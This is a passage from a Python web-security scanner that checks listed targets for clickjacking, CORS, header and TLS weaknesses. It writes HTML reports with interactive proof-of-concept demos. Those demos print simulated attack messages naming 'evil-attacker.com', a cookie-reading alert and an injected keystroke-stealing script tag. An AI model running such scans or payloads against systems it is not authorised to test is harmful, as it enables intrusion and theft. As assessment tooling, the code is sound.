    .decoy-card {{ background: rgba(255, 255, 255, 0.98); border: 2px solid #cbd5e0; border-radius: 12px; padding: 24px 32px; text-align: center; box-shadow: 0 4px 16px rgba(0,0,0,0.12); max-width: 440px; }}
    .decoy-icon {{ font-size: 32px; margin-bottom: 6px; }}
    .decoy-card h2 {{ font-size: 18px; color: #2d3748; margin-bottom: 6px; }}
    .decoy-card p {{ font-size: 13px; color: #4a5568; margin-bottom: 14px; }}
    .decoy-button {{ background: linear-gradient(135deg, #e53e3e, #dd6b20); color: white; border: none; padding: 14px 28px; font-size: 14px; font-weight: 800; border-radius: 6px; cursor: pointer; box-shadow: 0 3px 10px rgba(229,62,62,0.3); transition: transform 0.1s; letter-spacing: 0.5px; }}
    .decoy-button:active {{ transform: scale(0.97); }}
    .decoy-hint {{ font-size: 11px; color: #718096; margin-top: 10px; font-style: italic; }}

    /* Click Alert */
    .click-alert {{ display: none; margin-top: 14px; padding: 14px 18px; background: #fffaf0; border: 1px solid #fbd38d; border-left: 5px solid var(--warning); border-radius: 6px; }}
    .telemetry-header {{ display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }}
    .telemetry-header h4 {{ color: #c05621; font-size: 14px; }}
    .click-counter {{ background: #c05621; color: white; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 700; }}
    .coord {{ font-family: monospace; font-weight: 700; color: #2b6cb0; }}

    /* Markdown Export */
    .report-box {{ width: 100%; height: 380px; background: #1a202c; color: #e2e8f0; font-family: Consolas, monospace; font-size: 12px; padding: 16px; border-radius: 6px; border: none; resize: vertical; }}
</style>
</head>
<body>
<div class="container">
    <div class="header-bar">
        <div class="header-title">
            <h1>Web Security & Clickjacking Assessment</h1>
            <span class="badge" style="background: {theme_color}; font-size: 13px; padding: 5px 12px;">{risk_label} POSTURE</span>
        </div>
        <p style="color: var(--text-muted); font-size: 13px;">Target Audit: <strong>{final_url}</strong></p>
        <div class="meta-grid">
            <div class="meta-item"><div class="label">Host IP</div><div class="val">{ip}</div></div>
            <div class="meta-item"><div class="label">Risk Score</div><div class="val" style="color: {theme_color};">{score}</div></div>
            <div class="meta-item"><div class="label">Total Findings</div><div class="val">{len(findings)} Issue(s)</div></div>
            <div class="meta-item"><div class="label">Latency</div><div class="val">{latency} ms</div></div>
        </div>
    </div>

    <!-- Navigation Tabs (Clickjacking PoC Active by Default) -->
    <div class="tab-nav">
        <button class="tab-btn active" onclick="openTab(this, 'tab-poc')">🎯 Live Clickjacking PoC (Button Demo)</button>
        <button class="tab-btn" onclick="openTab(this, 'tab-findings')">🔍 Vulnerability Findings & Code Demos ({len(findings)})</button>
        <button class="tab-btn" onclick="openTab(this, 'tab-headers')">📊 HTTP Headers Audit</button>
        <button class="tab-btn" onclick="openTab(this, 'tab-report')">📋 Export Bug Bounty Report</button>
    </div>

    <!-- PoC Tab (Active By Default) -->
    {cj_tab_content}

    <!-- Findings Tab -->
    <div id="tab-findings" class="tab-content">
        {findings_html if findings else '<div class="card"><div class="card-body">No vulnerabilities detected. All verified checks passed.</div></div>'}
    </div>

    <!-- Headers Tab -->
    <div id="tab-headers" class="tab-content">
        <div class="table-container">
            <table>
                <thead>
                    <tr><th>Header Name</th><th>Observed Value</th><th>Compliance</th></tr>
                </thead>
                <tbody>
                    {header_rows}
                </tbody>
            </table>
        </div>
    </div>

    <!-- Report Tab -->
    <div id="tab-report" class="tab-content">
        <div style="margin-bottom: 12px;">
            <button class="btn" onclick="copyReport()">📋 Copy Report to Clipboard</button>
        </div>
        <textarea id="rawReport" class="report-box" readonly>{md_report}</textarea>
    </div>
</div>

<script>
    let clickCount = 0;

    function openTab(btn, id) {{
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(id).classList.add('active');
    }}

    function toggleCard(id) {{
        const el = document.getElementById('card-' + id);
        if (el) {{
            el.style.display = el.style.display === 'none' ? 'block' : 'none';
        }}
    }}

    function setMode(mode, btn) {{
        document.querySelectorAll('.btn-mode').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const stage = document.getElementById('simulatorStage');
        stage.className = 'simulator-stage mode-' + mode;
    }}

    function adjustOpacity(val) {{
        document.getElementById('opacityVal').innerText = val + '%';
        const overlay = document.getElementById('decoyOverlay');
        overlay.style.background = 'rgba(247, 250, 252, ' + (val / 100) + ')';
    }}

    function recordClick(e) {{
        clickCount++;
        document.getElementById('clickCounter').innerText = 'Total Clicks: ' + clickCount;
        document.getElementById('clickX').innerText = e.pageX;
        document.getElementById('clickY').innerText = e.pageY;
        
        const rect = document.getElementById('simulatorStage').getBoundingClientRect();
        const relX = Math.round(e.clientX - rect.left);
        const relY = Math.round(e.clientY - rect.top);
        document.getElementById('clickRel').innerText = relX + 'px, ' + relY + 'px';
        
        document.getElementById('clickAlert').style.display = 'block';
    }}

    function reloadIframe() {{
        const f = document.getElementById('targetFrame');
        if (f) f.src = f.src;
    }}

    function copyReport() {{
        const t = document.getElementById('rawReport');
        t.select();
        document.execCommand('copy');
        alert('Bug Bounty Report copied to clipboard!');
    }}

    // Interactive In-Card Demo Handlers
    function runCorsDemo(id) {{
        const el = document.getElementById('cors-out-' + id);
        el.style.display = 'block';
        el.innerHTML = '>> [TESTING] Initiating simulated Origin: https://evil-attacker.com\\n' +
                       '>> [SERVER RESPONSE] HTTP/1.1 200 OK\\n' +
                       '>> [ALERT] Access-Control-Allow-Origin: https://evil-attacker.com\\n' +
                       '>> [ALERT] Access-Control-Allow-Credentials: true\\n' +
                       '>> [EXPLOIT SUCCESS] Browser grants unrestricted DOM reading to attacker JavaScript! Private user data stolen.';
    }}

    function runCookieDemo(id) {{
        const el = document.getElementById('cookie-out-' + id);
        el.style.display = 'block';
        el.innerHTML = '>> [TESTING] Executing: alert(document.cookie);\\n' +
                       '>> [READ RESULT] "session_id=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; user=admin"\\n' +
                       '>> [EXPLOIT SUCCESS] Cookie lacks HttpOnly flag! Malicious injected script successfully copied token to clipboard.';
    }}

    function runHstsDemo(id) {{
        const el = document.getElementById('hsts-out-' + id);
        el.style.display = 'block';
        el.innerHTML = '>> [STEP 1] Victim requests http://target.com over Public Wi-Fi\\n' +
                       '>> [STEP 2] Adversary interceptor intercepts plaintext connection before 301 redirect\\n' +
                       '>> [STEP 3] SSL-Stripping proxy maintains HTTPS to real server, but serves plain HTTP to victim\\n' +
                       '>> [EXPLOIT SUCCESS] Victim submits login form -> Username and Password captured in cleartext!';
    }}

    function runCspDemo(id) {{
        const el = document.getElementById('csp-out-' + id);
        el.style.display = 'block';
        el.innerHTML = '>> [STEP 1] Injected payload: &lt;script&gt;sendKeystrokesToAttacker()&lt;/script&gt;\\n' +
                       '>> [STEP 2] Browser inspects Content-Security-Policy header... [NOT FOUND]\\n' +
                       '>> [EXPLOIT SUCCESS] Browser executes untrusted inline script with origin authority!';
    }}
</script>
</body>
</html>
"""
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(html)
    return report_file

# ═══════════════════════════════════════════════════
#  BUILT-IN PREVIEW WEB SERVER
# ═══════════════════════════════════════════════════

def serve_preview(port=8080):
    lines = [
        f"{G}{BO}[+] Local Preview URL :{RS} {C}{BO}http://127.0.0.1:{port}/{RS}",
        f"{W}[+] Serving Directory  :{RS} {os.getcwd()}",
        f"{W}[+] Browser Status     :{RS} {G}Auto-launched in default browser{RS}",
        f"{Y}[!] Server Status      :{RS} {Y}Active (Press Ctrl+C to terminate){RS}",
    ]
    print()
    print_cyber_box(f"{Y}{BO}INTERACTIVE POC LOCAL PREVIEW SERVER{RS}", lines, width=68, color=C)
    print()
    try:
        webbrowser.open(f"http://127.0.0.1:{port}/")
        server = HTTPServer(('127.0.0.1', port), SimpleHTTPRequestHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Preview server stopped successfully.{RS}\n")
    except Exception as e:
        print(f"{R}[!] Unable to launch preview server: {e}{RS}\n")

# ═══════════════════════════════════════════════════
#  FILE READER & CLI ENTRY
# ═══════════════════════════════════════════════════

def read_target_list(path):
    with open(path, 'rb') as f:
        raw = f.read()
    if raw.startswith(b'\xff\xfe') or raw.startswith(b'\xfe\xff'):
        content = raw.decode('utf-16')
    elif raw.startswith(b'\xef\xbb\xbf'):
        content = raw.decode('utf-8-sig')
    else:
        content = raw.decode('utf-8', errors='ignore')
    return [l.strip().replace('\x00', '') for l in content.splitlines() if l.strip() and not l.strip().startswith('#')]

def main():
    print_banner()

    if len(argv) >= 2 and argv[1] == '--serve':
        port = int(argv[2]) if len(argv) > 2 else 8080
        serve_preview(port)
        exit(0)

    if len(argv) < 2:
        print(f"{Y}[*] Usage:{RS}")
        print(f"  Standard Audit : python Clickjacking_Finder.py <targets_file> [threads]")
        print(f"  Launch Preview : python Clickjacking_Finder.py --serve [port]\n")
        print(f"  Example: python Clickjacking_Finder.py targets.txt 10")
        print(f"  Example: python Clickjacking_Finder.py --serve 8080\n")
        exit(0)

    target_file = argv[1]
    threads = int(argv[2]) if len(argv) > 2 else THREADS

    try:
        targets = read_target_list(target_file)
    except Exception as e:
        print(f"{R}[!] Unable to read targets file: {e}{RS}\n")
        exit(0)

    total = len(targets)
    print(f"{C}[*]{RS} Loaded Targets: {BO}{total}{RS} | Worker Threads: {BO}{threads}{RS} | Timeout: {BO}{TIMEOUT}s{RS}")
    print(f"{C}[*]{RS} Assessment Scope: Clickjacking, CORS, Headers, Sensitive Files, SSL/TLS, Methods\n")

    results = {}
    completed = [0]
    lock = __import__('threading').Lock()

    def worker(t):
        res = scan_target(t)
        with lock:
            completed[0] += 1
            pct = int((completed[0] / total) * 20)
            bar = "#" * pct + "-" * (20 - pct)
            print(f"\r  [{bar}] {completed[0]}/{total} Completed", end='', flush=True)
        return res

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(worker, t): t for t in targets}
        for fut in as_completed(futures):
            raw, final, ip, status, lat, findings, err, hdrs = fut.result()
            results[raw] = (final, ip, status, lat, findings, err, hdrs)

    print("\n")

    # Render sorted results
    sorted_res = sorted(results.items(), key=lambda x: -calc_score(x[1][4]))
    summary_data = []

    for idx, (raw, (final, ip, status, lat, findings, err, hdrs)) in enumerate(sorted_res, 1):
        print_target_result(idx, total, raw, final, ip, status, lat, findings, err)
        if not err and findings:
            report_name = generate_poc_report(raw, final, ip, status, lat, findings, hdrs)
            print(f"  {Y}[>] Interactive PoC & Report Saved:{RS} {BO}{report_name}{RS}\n")
            summary_data.append((raw, len(findings), calc_score(findings)))
        elif not err:
            summary_data.append((raw, 0, 0))

    # ── FINAL AUDIT SUMMARY MATRIX ──
    width = 68
    print()
    print_cyber_box(f"{Y}{BO}FINAL AUDIT SUMMARY MATRIX{RS}", [
        f"{W}{BO}{'TARGET':<35} | {'ISSUES':<8} | {'RISK SCORE':<12}{RS}",
        f"{DM}{'-'*35}-+-{'-'*8}-+-{'-'*12}{RS}"
    ] + [
        f"{t:<35} | {c:<8} | {get_overall_risk(sc)[1]}{sc} ({get_overall_risk(sc)[0]}){RS}"
        for t, c, sc in summary_data
    ], width=width, color=C)
    print()
    print(f"{G}[*] Tip: Run `python Clickjacking_Finder.py --serve` to view interactive PoCs in your browser.{RS}\n")

if __name__ == '__main__':
    main()
